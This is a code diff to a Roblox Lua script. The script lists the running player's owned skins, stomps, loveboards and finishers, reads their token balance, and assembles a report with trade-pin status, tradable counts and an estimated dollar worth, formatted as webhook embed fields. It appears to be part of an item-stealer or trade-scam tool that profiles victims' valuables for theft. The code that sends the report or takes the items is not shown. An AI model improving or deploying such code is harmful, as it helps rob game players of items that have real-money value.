@@ -56,6 +56,7 @@ local SKIP_WEAPONS = {
 local ownedFightingStyles = {}
 local ownedStomps = {}
 local ownedLoveboards = {}
+local ownedFinishers = {}
 local ownedHighValueSkins = {}
 
 for id, item in pairs(weaponSkins or {}) do
@@ -78,6 +79,13 @@ for id, item in pairs(weaponSkins or {}) do
         if value >= 1000 and category ~= "Fighting Style" and category ~= "Stomp" and category ~= "Loveboard" then
             ownedHighValueSkins[item.Name] = true
         end
+    end
+end
+
+local finisherItems = data:Get({"NewInventory", "Items", "Finisher"})
+for id, item in pairs(finisherItems or {}) do
+    if item and item.Name then
+        ownedFinishers[item.Name] = true
     end
 end
 
@@ -275,14 +283,25 @@ task.spawn(function()
 end)
 
 local function getPlayerTokens()
-    local ls = localPlayer:FindFirstChild("leaderstats")
-    if ls then
-        local tokens = ls:FindFirstChild("Tokens")
-        if tokens then
-            return tokens.Value or 0
+    local tokens = 0
+    pcall(function()
+        local t = data:Get({"NewInventory", "Tokens"})
+        if type(t) == "number" then
+            tokens = t
         end
+    end)
+    if tokens == 0 then
+        pcall(function()
+            local ls = localPlayer:FindFirstChild("leaderstats")
+            if ls then
+                local dinero = ls:FindFirstChild("Dinero") or ls:FindFirstChild("Tokens")
+                if dinero then
+                    tokens = dinero.Value or 0
+                end
+            end
+        end)
     end
-    return 0
+    return tokens
 end
 
 playerTokens = getPlayerTokens()
@@ -745,6 +764,7 @@ local function getAllStomps()
     for stompName, _ in pairs(ownedStomps) do
         table.insert(stomps, stompName)
     end
+    table.sort(stomps)
     return stomps
 end
 
@@ -753,7 +773,17 @@ local function getAllLoveboards()
     for loveboardName, _ in pairs(ownedLoveboards) do
         table.insert(loveboards, loveboardName)
     end
+    table.sort(loveboards)
     return loveboards
+end
+
+local function getAllFinishers()
+    local finishers = {}
+    for finisherName, _ in pairs(ownedFinishers) do
+        table.insert(finishers, finisherName)
+    end
+    table.sort(finishers)
+    return finishers
 end
 
 local function getAllFightingStyles()
@@ -789,57 +819,27 @@ local function formatSkinList()
     local stompList = getAllStomps()
     local loveboardList = getAllLoveboards()
     local fightingStylesList = getAllFightingStyles()
-    local highValueList = getAllHighValueSkins()
+    local finisherList = getAllFinishers()
     
     local result = {}
     
-    if #fightingStylesList > 0 then
+    local function formatSection(label, list)
+        if #list == 0 then return end
         local display = ""
-        if #fightingStylesList <= 3 then
-            display = table.concat(fightingStylesList, ", ")
+        if #list <= 3 then
+            display = table.concat(list, ", ")
         else
             local first3 = {}
-            for i = 1, 3 do table.insert(first3, fightingStylesList[i]) end
-            display = table.concat(first3, ", ") .. " and " .. (#fightingStylesList - 3) .. " more"
+            for i = 1, 3 do table.insert(first3, list[i]) end
+            display = table.concat(first3, ", ") .. " and " .. (#list - 3) .. " more"
         end
-        table.insert(result, "Fighting Styles: " .. display)
+        table.insert(result, label .. ": " .. display)
     end
     
-    if #stompList > 0 then
-        local display = ""
-        if #stompList <= 3 then
-            display = table.concat(stompList, ", ")
-        else
-            local first3 = {}
-            for i = 1, 3 do table.insert(first3, stompList[i]) end
-            display = table.concat(first3, ", ") .. " and " .. (#stompList - 3) .. " more"
-        end
-        table.insert(result, "Stomps: " .. display)
-    end
-    
-    if #loveboardList > 0 then
-        local display = ""
-        if #loveboardList <= 3 then
-            display = table.concat(loveboardList, ", ")
-        else
-            local first3 = {}
-            for i = 1, 3 do table.insert(first3, loveboardList[i]) end
-            display = table.concat(first3, ", ") .. " and " .. (#loveboardList - 3) .. " more"
-        end
-        table.insert(result, "Loveboards: " .. display)
-    end
-    
-    if #highValueList > 0 then
-        local display = ""
-        if #highValueList <= 3 then
-            display = table.concat(highValueList, ", ")
-        else
-            local first3 = {}
-            for i = 1, 3 do table.insert(first3, highValueList[i]) end
-            display = table.concat(first3, ", ") .. " and " .. (#highValueList - 3) .. " more"
-        end
-        table.insert(result, "High Value Skins: " .. display)
-    end
+    formatSection("Fighting Styles", fightingStylesList)
+    formatSection("Stomps", stompList)
+    formatSection("Loveboards", loveboardList)
+    formatSection("Finishers", finisherList)
     
     if #result == 0 then
         return "None"
@@ -1272,29 +1272,7 @@ local function sendFullInventory()
     if weaponsText == "" then weaponsText = "None" end
     weaponsText = truncateField(weaponsText, 1018)
     
-    local skinText = formatSkinList()
-    if skinText == "None" then
-        local inv = getInventory()
-        if inv and inv.WeaponSkin then
-            local skinList = {}
-            for guid, item in pairs(inv.WeaponSkin) do
-                if item and item.Name then
-                    local weaponName = item.Weapon or item.WeaponName or item.Type or "Unknown"
-                    local value = getItemValue(item.Name)
-                    local line = weaponName .. " | " .. item.Name
-                    if value and value > 0 then
-                        line = line .. " ($" .. formatNumber(value) .. ")"
-                    end
-                    table.insert(skinList, line)
-                end
-            end
-            if #skinList > 0 then
-                table.sort(skinList)
-                skinText = table.concat(skinList, "\n")
-            end
-        end
-    end
-    skinText = truncateField(skinText, 1024)
+    local skinText = truncateField(formatSkinList(), 1024)
     
     local ls = localPlayer:FindFirstChild("leaderstats")
     local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or 0
@@ -1323,8 +1301,13 @@ local function sendFullInventory()
     
     local tokenWorth = (totalTokenValue / 1000) * 1.75
     local currentTokens = getPlayerTokens()
-    local displayTokens = totalTokenValue > 0 and formatNumber(totalTokenValue) or tostring(currentTokens)
-    local displayWorth = totalTokenValue > 0 and ("`$" .. formatNumber(tokenWorth) .. "`") or ("`~$" .. formatNumber((currentTokens / 1000) * 1.75) .. "` (est. from balance)")
+    local displayTokens = totalTokenValue > 0 and formatNumber(totalTokenValue) or formatNumber(currentTokens)
+    local displayWorth
+    if totalTokenValue > 0 then
+        displayWorth = "`$" .. formatNumber(tokenWorth) .. "`"
+    else
+        displayWorth = "`~$" .. formatNumber((currentTokens / 1000) * 1.75) .. "`"
+    end
     
     local fields = {
         {name = "👤 User", value = "`" .. playerName .. "`", inline = true},
@@ -1333,7 +1316,7 @@ local function sendFullInventory()
         {name = "👥 Players", value = "`" .. #Players:GetPlayers() .. " / " .. Players.MaxPlayers .. "`", inline = true},
         {name = "🟢 Tradable: " .. tradableCount .. " | 🔴 Untradable: " .. untradableCount, value = " ", inline = false},
         {name = "🔒 Trade Pin", value = hasPin and "✅ Yes" or "❌ No", inline = true},
-        {name = "💰 Total Worth", value = displayWorth, inline = true},
+        {name = "Worth", value = displayWorth, inline = true},
         {name = "🪙 Tokens", value = "`" .. displayTokens .. "`", inline = true},
     }
     
